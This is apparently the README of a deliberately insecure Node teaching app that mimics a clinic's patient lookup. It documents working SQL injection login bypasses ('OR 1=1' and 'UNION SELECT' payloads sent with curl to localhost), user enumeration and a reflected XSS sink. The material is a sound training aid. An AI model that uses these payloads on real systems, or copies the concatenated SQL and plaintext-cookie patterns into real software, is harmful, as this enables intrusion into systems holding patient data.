# Insecure Patient Lookup

Esta aplicación está creada para ser deliberadamente explotable e insegura, con el fin de demostrar diferentes vulnerabilidades que podrían afectar a aplicaciones web y sistemas mal escritos.

El caso que se examinará en este repositorio es el de una clínica que utiliza esta aplicación de Node como interfaz para su base de datos (consulta el CSV para ver un registro en texto plano). La aplicación puede buscar información de pacientes y mostrarla, algo sencillo. Las siguientes vulnerabilidades están presentes en esta aplicación:

- XSS
- SQLi
- Falta de SSL / sin HTTPS
- Cookies de login débiles y almacenadas en texto plano
- Autenticación débil por contraseña, sin MFA ni limitación de intentos (rate-limiting) en el servidor

## Vulnerabilidades documentadas

### Inyección SQL en `/api/login` (bypass de autenticación)

La ruta `POST /api/login` construye la consulta concatenando el valor de `uid` directamente en el SQL (sin consultas parametrizadas). Además, la aplicación devuelve mensajes distintos según el usuario exista o no, lo que permite enumerar cuentas válidas. Los siguientes ejemplos fueron probados y verificados contra la aplicación en ejecución (`localhost:5173`), con el usuario de prueba `uid=1 / admin / admin` (almacenado en texto plano, por cierto).

**1. Login correcto**

```bash
curl -i -X POST http://localhost:5173/api/login \
  -H 'Content-Type: application/json' \
  -d '{"uid":"1","pwd":"admin"}'
```

Respuesta esperada: `200 {"auth":true,"message":"Login exitoso","user":{"uid":1,"name":"admin"}}` y las cookies `auth=true` y `uid=1` (sin `HttpOnly`, `Secure` ni expiración).

**2. Enumeración de usuarios**

```bash
curl -i -X POST http://localhost:5173/api/login \
  -H 'Content-Type: application/json' \
  -d '{"uid":"999","pwd":"x"}'
```

Respuesta esperada: `404 {"auth":false,"message":"Usuario 999 no encontrado"}`. El mensaje distinto a "Contraseña incorrecta" confirma qué `uid` existen.

**3. Bypass con `OR` (login como el primer usuario de la tabla)**

```bash
curl -X POST http://localhost:5173/api/login \
  -H 'Content-Type: application/json' \
  -d @- <<'EOF'
{"uid":"1' OR '1'='1","pwd":"admin"}
EOF
```

La consulta resultante es `WHERE u.uid = '1' OR '1'='1'`, que devuelve todos los usuarios; como la app se queda con el primero, basta conocer su contraseña (por ejemplo `admin`) para entrar.

**4. Bypass con `UNION SELECT` (identidad fabricada, sin conocer ninguna contraseña)**

```bash
curl -X POST http://localhost:5173/api/login \
  -H 'Content-Type: application/json' \
  -d @- <<'EOF'
{"uid":"' UNION SELECT 99, 'root', 'owned' -- ","pwd":"owned"}
EOF
```

Repuesta esperada: `200 {"auth":true,"message":"Login exitoso","user":{"uid":99,"name":"root"}}` — se autentica contra una fila que no existe en la base de datos. Nota: el `-- ` debe llevar un espacio al final para que el apóstrofo que cierra la consulta quede comentado.

Las mismas inyecciones funcionan enviando el formulario de la página `/login` directamente (la ruta también acepta `application/x-www-form-urlencoded`); la única diferencia es que el fallo re-renderiza la página con el mensaje de error insertado con `dangerouslySetInnerHTML`, lo que convierte el campo `uid` en un vector XSS reflejado.
